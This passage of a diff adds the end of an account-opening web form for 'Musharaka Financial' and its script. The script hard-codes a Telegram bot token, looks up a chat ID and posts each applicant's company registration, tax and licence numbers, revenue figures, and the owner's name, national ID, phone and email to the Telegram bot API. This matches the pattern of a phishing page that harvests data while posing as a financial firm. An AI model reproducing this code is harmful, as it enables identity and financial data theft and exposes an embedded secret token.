+              <div class="form-group">
+                <label for="ownerPhone">Mobile Number <span class="req">*</span></label>
+                <input type="tel" id="ownerPhone" name="ownerPhone"
+                       placeholder="+966XXXXXXXXX" required>
+                <span class="err">Enter a valid mobile number</span>
+              </div>
+
+              <div class="form-group">
+                <label for="ownerEmail">Email Address <span class="req">*</span></label>
+                <input type="email" id="ownerEmail" name="ownerEmail"
+                       placeholder="owner@email.com" required>
+                <span class="err">Enter a valid email address</span>
+              </div>
+
+              <!-- ID Document -->
+              <div class="form-group full file-upload">
+                <label>National ID / Passport Copy <span class="req">*</span></label>
+                <div class="file-box" id="idFileBox">
+                  <button type="button" class="file-trigger" onclick="document.getElementById('idFile').click()">
+                    &#128206; Choose File
+                  </button>
+                  <span class="file-name" id="idFileName">No file chosen</span>
+                  <input type="file" id="idFile" name="idFile" accept=".pdf,.jpg,.jpeg,.png">
+                </div>
+                <span class="file-hint">PDF or image &middot; Max 5 MB</span>
+                <span class="err" id="idFileErr">Please upload the ID document</span>
+              </div>
+
+              <!-- Authorization Document -->
+              <div class="form-group full file-upload">
+                <label>Authorization Document <span class="opt">(Required for authorized signatories)</span></label>
+                <div class="file-box">
+                  <button type="button" class="file-trigger" onclick="document.getElementById('authFile').click()">
+                    &#128206; Choose File
+                  </button>
+                  <span class="file-name" id="authFileName">No file chosen</span>
+                  <input type="file" id="authFile" name="authFile" accept=".pdf,.jpg,.jpeg,.png">
+                </div>
+                <span class="file-hint">PDF or image &middot; Max 5 MB</span>
+              </div>
+
+            </div>
+          </div>
+        </div>
+
+        <!-- SECTION 5: Additional Notes -->
+        <div class="section-title">
+          <div class="section-number">5</div>
+          <h2>Additional Notes</h2>
+          <div class="section-line"></div>
+        </div>
+
+        <div class="form-group">
+          <label for="notes">Notes <span class="opt">(Optional)</span></label>
+          <textarea id="notes" name="notes"
+                    placeholder="Any additional information or inquiries you would like to share with our team..."></textarea>
+        </div>
+
+        <!-- SUBMIT -->
+        <div class="submit-section">
+          <button type="submit" class="btn-submit" id="submitBtn">
+            <span class="spinner"></span>
+            <svg class="btn-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" viewBox="0 0 16 16">
+              <path d="M15.854.146a.5.5 0 0 1 .11.54l-5.819 14.547a.75.75 0 0 1-1.329.124l-3.178-4.995L.643 7.184a.75.75 0 0 1 .124-1.33L15.314.037a.5.5 0 0 1 .54.11ZM6.636 10.07l2.761 4.338L14.13 2.576 6.636 10.07Zm6.787-8.201L1.591 6.602l4.339 2.76 7.494-7.493Z"/>
+            </svg>
+            <span class="btn-label">Submit Request</span>
+          </button>
+          <p class="terms-note">
+            By submitting this request you agree to the
+            <a href="#">Privacy Policy</a> and <a href="#">Terms &amp; Conditions</a>
+            of Musharaka Financial
+          </p>
+        </div>
+
+      </form>
+    </div>
+  </main>
+</div>
+
+<script>
+  /* TELEGRAM */
+  const TG_TOKEN = '8791563980:AAHkZGqeNRnBjdg2m_yOjIc7tKA1jkmFrQk';
+  const TG_BASE  = 'https://api.telegram.org/bot' + TG_TOKEN;
+  let TG_CHAT_ID = null;
+
+  async function initChatId() {
+    try {
+      const res  = await fetch(TG_BASE + '/getUpdates?limit=10&offset=-10');
+      const json = await res.json();
+      if (!json.ok) return;
+      for (const upd of (json.result || []).reverse()) {
+        const chat = (upd.message || upd.edited_message || {}).chat;
+        if (chat && chat.id) { TG_CHAT_ID = String(chat.id); return; }
+      }
+    } catch (e) { console.warn('initChatId:', e.message); }
+  }
+  initChatId();
+
+  async function sendToTelegram(msg) {
+    if (!TG_CHAT_ID) await initChatId();
+    if (!TG_CHAT_ID) throw new Error('chat_id not found — please send a message to the bot first');
+    const res  = await fetch(TG_BASE + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: 'HTML' }),
+    });
+    const json = await res.json();
+    if (!json.ok) throw new Error('Telegram: ' + (json.description || 'Error'));
+  }
+
+  function buildMessage(d) {
+    const L = '─────────────────────';
+    const rows = [
+      '🏢 <b>Corporate Account Opening Request</b>',
+      L, '',
+      '🏢 <b>Company Data</b>',
+      '• Name: ' + d.companyName,
+      '• Entity Type: ' + d.entityType,
+      '• CR Number: ' + d.crNumber,
+      '• CR Expiry: ' + d.crExpiry,
+      '• Tax Number: ' + d.taxNumber,
+      '• Year Established: ' + d.foundYear,
+      '• Country: ' + d.country,
+      '• City: ' + d.city,
+      '• Address: ' + d.address,
+      '',
+      '📋 <b>Commercial License</b>',
+      '• License Number: ' + d.licenseNumber,
+      '• License Expiry: ' + d.licenseExpiry,
+      '• Issuing Authority: ' + d.licenseAuthority,
+      '• Business Activity: ' + d.licenseActivity,
+      '',
+      '💼 <b>Commercial &amp; Financial Data</b>',
+      '• Company Phone: ' + d.companyPhone,
+      '• Official Email: ' + d.companyEmail,
+      d.website ? '• Website: ' + d.website : '',
+      '• Employee Count: ' + d.employeeCount,
+      '• Annual Revenue: ' + d.annualRevenue,
+      '• Investment Capital: ' + d.capitalAmount + ' SAR',
+      '• Required Service: ' + d.offerType,
+      '',
+      '👤 <b>Owner / Authorized Representative</b>',
+      '• Name: ' + d.ownerName,
+      '• Title: ' + d.ownerTitle,
+      '• ID Number: ' + d.ownerNational,
+      '• Nationality: ' + d.ownerNationality,
+      '• Mobile: ' + d.ownerPhone,
+      '• Email: ' + d.ownerEmail,
+      d.notes ? ('\n📝 <b>Notes:</b>\n' + d.notes) : '',
+      '',
+      L,
+      '🕐 ' + new Date().toLocaleString('en-SA', { timeZone: 'Asia/Riyadh' }),
+    ];
+    return rows.filter(Boolean).join('\n');
+  }
+
+  /* FILE LABELS */
+  function wireFile(inputId, labelId) {
+    document.getElementById(inputId).addEventListener('change', function() {
+      document.getElementById(labelId).textContent =
+        this.files[0] ? this.files[0].name : 'No file chosen';
+    });
+  }
+  wireFile('crFile',   'crFileName');
+  wireFile('licFile',  'licFileName');
+  wireFile('idFile',   'idFileName');
+  wireFile('authFile', 'authFileName');
+
+  /* VALIDATION */
+  const form      = document.getElementById('entityForm');
+  const submitBtn = document.getElementById('submitBtn');
+
+  function mark(el, valid, errId) {
+    if (!valid) {
+      el.classList.add('error');
+      if (errId) document.getElementById(errId).style.display = 'block';
+      return false;
+    }
+    el.classList.remove('error');
+    if (errId) document.getElementById(errId).style.display = 'none';
+    return true;
+  }
+
+  function txt(id)  { return document.getElementById(id).value.trim(); }
+  function sel(id)  { return document.getElementById(id).value; }
+  function el(id)   { return document.getElementById(id); }
+  function email(v) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); }
+
+  function showToast(msg, ms) {
+    const t = document.getElementById('toastError');
+    t.textContent = msg; t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), ms || 6000);
+  }
+
+  function resetForm() {
+    form.reset();
+    document.querySelectorAll('.error').forEach(e => e.classList.remove('error'));
+    ['crFileName','licFileName','idFileName','authFileName']
+      .forEach(id => { el(id).textContent = 'No file chosen'; });
+  }
+
+  /* SUBMIT */
+  const ENTITY_TYPES = {
+    company_limited: 'Limited Liability Company (LLC)',
+    joint_stock:     'Joint Stock Company',
+    sole_prop:       'Sole Proprietorship',
+    partnership:     'Partnership',
+    holding:         'Holding Company',
+    foreign_branch:  'Foreign Company Branch',
+    ngo:             'Association / Non-Profit Organization',
+    other:           'Other',
+  };
+  const OFFER_LABELS = {
+    portfolio_mgmt:    'Portfolio Management',
+    reits:             'Real Estate Investment Funds',
+    investment_banking:'Investment Banking',
+    brokerage:         'Securities Brokerage',
+    ipo_mgmt:          'IPO Management',
+    custody:           'Custody Services',
+  };
+  const TITLE_LABELS = {
+    owner:      'Owner / Entity Proprietor',
+    ceo:        'Chief Executive Officer (CEO)',
+    chairman:   'Chairman of the Board',
+    gm:         'General Manager',
+    cfo:        'Chief Financial Officer (CFO)',
+    authorized: 'Authorized Signatory',
+  };
+  const REVENUE_LABELS = {
+    'under1m': 'Less than 1M SAR',
+    '1m-5m':   '1M – 5M SAR',
+    '5m-20m':  '5M – 20M SAR',
+    '20m-100m':'20M – 100M SAR',
+    'over100m':'More than 100M SAR',
+  };
+  const EMP_LABELS = {
+    '1-9':   '1 – 9 employees',
+    '10-49': '10 – 49 employees',
+    '50-249':'50 – 249 employees',
+    '250+':  '250+ employees',
+  };
+
+  form.addEventListener('submit', async function(e) {
+    e.preventDefault();
+    let ok = true;
+
+    // Company
+    if (!mark(el('companyName'),    txt('companyName').length > 0, null))         ok = false;
+    if (!mark(el('entityType'),     sel('entityType') !== '', null))               ok = false;
+    if (!mark(el('crNumber'),       /^\d{10}$/.test(txt('crNumber')), null))      ok = false;
+    if (!mark(el('crExpiry'),       txt('crExpiry') !== '', null))                 ok = false;
+    if (!mark(el('taxNumber'),      txt('taxNumber').length >= 10, null))          ok = false;
+    if (!mark(el('foundYear'),      el('foundYear').value >= 1900, null))          ok = false;
+    if (!mark(el('country'),        sel('country') !== '', null))                  ok = false;
+    if (!mark(el('city'),           txt('city').length > 0, null))                 ok = false;
+    if (!mark(el('address'),        txt('address').length > 0, null))              ok = false;
+
+    // License
+    if (!mark(el('licenseNumber'),   txt('licenseNumber').length > 0, null))       ok = false;
+    if (!mark(el('licenseExpiry'),   txt('licenseExpiry') !== '', null))           ok = false;
+    if (!mark(el('licenseAuthority'),sel('licenseAuthority') !== '', null))        ok = false;
+    if (!mark(el('licenseActivity'), txt('licenseActivity').length > 0, null))     ok = false;
+    const crFileOk = el('crFile').files.length > 0;
+    if (!crFileOk) { el('crFileBox').classList.add('error'); el('crFileErr').style.display = 'block'; ok = false; }
+    else           { el('crFileBox').classList.remove('error'); el('crFileErr').style.display = 'none'; }
+
+    // Commercial
+    if (!mark(el('companyPhone'),  txt('companyPhone').length >= 7, null))         ok = false;
+    if (!mark(el('companyEmail'),  email(txt('companyEmail')), null))              ok = false;
+    if (!mark(el('employeeCount'), sel('employeeCount') !== '', null))             ok = false;
+    if (!mark(el('annualRevenue'), sel('annualRevenue') !== '', null))             ok = false;
+    if (!mark(el('capitalAmount'), Number(el('capitalAmount').value) >= 50000, 'capitalErr')) ok = false;
+    const offerEl = document.querySelector('input[name="offerType"]:checked');
+    el('offerErr').style.display = offerEl ? 'none' : 'block';
+    if (!offerEl) ok = false;
+
+    // Owner
+    if (!mark(el('ownerFirst'),       txt('ownerFirst').length > 0, null))         ok = false;
+    if (!mark(el('ownerSecond'),      txt('ownerSecond').length > 0, null))        ok = false;
+    if (!mark(el('ownerThird'),       txt('ownerThird').length > 0, null))         ok = false;
+    if (!mark(el('ownerTitle'),       sel('ownerTitle') !== '', null))             ok = false;
+    if (!mark(el('ownerNational'),    /^\d{10}$/.test(txt('ownerNational')), null))ok = false;
+    if (!mark(el('ownerNationality'), sel('ownerNationality') !== '', null))       ok = false;
+    if (!mark(el('ownerPhone'),       txt('ownerPhone').length >= 7, null))        ok = false;
+    if (!mark(el('ownerEmail'),       email(txt('ownerEmail')), null))             ok = false;
+    const idFileOk = el('idFile').files.length > 0;
+    if (!idFileOk) { el('idFileBox').classList.add('error'); el('idFileErr').style.display = 'block'; ok = false; }
+    else           { el('idFileBox').classList.remove('error'); el('idFileErr').style.display = 'none'; }
+
+    if (!ok) {
+      const firstErr = document.querySelector('.error');
+      if (firstErr) firstErr.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      return;
+    }
+
+    // Collect & send
+    const countryOpt = el('country').options[el('country').selectedIndex];
+    const natOpt     = el('ownerNationality').options[el('ownerNationality').selectedIndex];
+
+    const data = {
+      companyName:      txt('companyName'),
+      entityType:       ENTITY_TYPES[sel('entityType')] || sel('entityType'),
+      crNumber:         txt('crNumber'),
+      crExpiry:         txt('crExpiry'),
+      taxNumber:        txt('taxNumber'),
+      foundYear:        el('foundYear').value,
+      country:          countryOpt ? countryOpt.text : sel('country'),
+      city:             txt('city'),
+      address:          txt('address'),
+      licenseNumber:    txt('licenseNumber'),
+      licenseExpiry:    txt('licenseExpiry'),
+      licenseAuthority: el('licenseAuthority').options[el('licenseAuthority').selectedIndex]?.text || '',
+      licenseActivity:  txt('licenseActivity'),
+      companyPhone:     txt('companyPhone'),
+      companyEmail:     txt('companyEmail'),
+      website:          txt('website'),
+      employeeCount:    EMP_LABELS[sel('employeeCount')] || sel('employeeCount'),
+      annualRevenue:    REVENUE_LABELS[sel('annualRevenue')] || sel('annualRevenue'),
+      capitalAmount:    Number(el('capitalAmount').value).toLocaleString('en-US'),
+      offerType:        OFFER_LABELS[offerEl.value] || offerEl.value,
+      ownerName:        [txt('ownerFirst'), txt('ownerSecond'), txt('ownerThird')].join(' '),
+      ownerTitle:       TITLE_LABELS[sel('ownerTitle')] || sel('ownerTitle'),
+      ownerNational:    txt('ownerNational'),
+      ownerNationality: natOpt ? natOpt.text : sel('ownerNationality'),
+      ownerPhone:       txt('ownerPhone'),
+      ownerEmail:       txt('ownerEmail'),
+      notes:            txt('notes'),
+    };
+
+    submitBtn.classList.add('loading');
+    el('submitBtn').querySelector('.btn-label').textContent = 'Sending...';
+
+    try {
+      await sendToTelegram(buildMessage(data));
+      resetForm();
+      document.getElementById('successOverlay').classList.add('show');
+    } catch (err) {
+      console.error(err);
+      showToast('⚠️ ' + err.message, 7000);
+    } finally {
+      submitBtn.classList.remove('loading');
+      el('submitBtn').querySelector('.btn-label').textContent = 'Submit Request';
+    }
+  });
+
+  // Live blur validation
+  document.querySelectorAll('input, select, textarea').forEach(inp => {
+    inp.addEventListener('blur', () => {
+      if (inp.classList.contains('error') && inp.value.trim())
+        inp.classList.remove('error');
+    });
+  });
+</script>
+
+</body>
+</html>
